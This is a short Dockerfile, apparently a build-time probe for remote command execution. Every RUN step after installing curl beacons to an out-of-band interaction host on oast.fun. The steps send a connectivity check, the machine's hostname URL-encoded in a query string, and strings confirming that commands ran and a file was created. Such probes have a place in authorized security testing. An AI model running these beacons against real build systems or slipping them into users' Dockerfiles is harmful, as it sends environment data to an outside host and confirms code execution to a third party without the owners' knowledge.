FROM alpine:3.20

RUN apk add --no-cache curl

# Test outbound connectivity
RUN curl -sS "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/?test=build"

# Send hostname
RUN DATA="$(hostname)" && \
    curl -sS --get \
      --data-urlencode "hostname=${DATA}" \
      "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/"

# Test command execution with a benign value
RUN DATA="$(printf 'command-executed')" && \
    curl -sS --get \
      --data-urlencode "result=${DATA}" \
      "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/"

# Create a file and verify that the command executed
RUN touch test.txt && \
    DATA="$(test -f test.txt && printf 'file-created')" && \
    curl -sS --get \
      --data-urlencode "result=${DATA}" \
      "https://tqejbsqsbxlibayuvxxsi3pe49i6iojwa.oast.fun/"
